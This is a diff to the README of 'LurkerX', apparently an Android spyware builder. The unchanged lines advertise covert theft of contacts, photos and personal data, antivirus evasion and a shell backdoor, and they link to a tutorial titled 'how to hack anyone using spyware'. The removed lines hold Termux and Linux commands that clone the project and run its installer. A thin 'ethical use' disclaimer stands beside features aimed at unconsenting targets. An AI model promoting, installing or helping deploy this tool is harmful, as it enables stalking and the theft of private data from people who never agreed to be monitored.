@@ -48,30 +48,6 @@ It is crucial to emphasize that LurkerX is intended for ethical and educational 
 * **Data Exfiltration:** LurkerX can exfiltrate sensitive data from the target device, including contacts, photos, and other personal information.
 * **Stealthy Operation:** LurkerX is designed to operate stealthily, evading detection by antivirus and security software.
 * **Backdoor:** LurkerX allows advanced users to create custom commands in Shell Script for additional functionality and data collection.
-
-## How to install
-<h2>METHOD: 1 (Works On Termux & Linux)</h2>
-<ol>
-  <li> Update your system for new updates to reflect:
-    <p>
-      <b>For Termux Users, copy and run the command below:</b>
-      <pre>
-        <code>
-          termux-setup-storage && cd $HOME && apt update && apt upgrade && apt install openjdk-17 && pkg install git apktool python3 python3-pip -y && git clone https://github.com/nemesis-guy/LurkerX.git && cd LurkerX && ls && bash install.sh
-        </code>
-      </pre>
-    </p>
-    <p>
-      <b>For Linux Users, copy and run the command below:</b>
-      <pre>
-        <code>
-          cd $HOME && sudo apt update && sudo apt upgrade && sudo apt install default-jdk git python3 python3-pip -y && git clone https://github.com/nemesis-guy/LurkerX.git && cd LurkerX && ls && ./install.sh
-        </code>
-      </pre>
-    </p>
-  </li>
-  <li>The command above just install and sets up the environment for LurkerX to run without errors.<br>
-          Visit the official tutorial page to learn how you can generate the app by using the links below:<br>
     <p align="center">
       <a href="https://nemesisguy.onrender.com/blog/how_to_hack_anyone_using_spyware.html">
         <img src="https://img.shields.io/badge/Tutorial_Page-teal?style=for-the-badge&logo=website">
@@ -81,8 +57,6 @@ It is crucial to emphasize that LurkerX is intended for ethical and educational 
         <img src="https://img.shields.io/badge/TikTok_Video_Link-grey?style=for-the-badge&logo=tiktok">
       </a>
     </p>
-  </li>
-</ol>
 
 **Ethical Usage:**
 
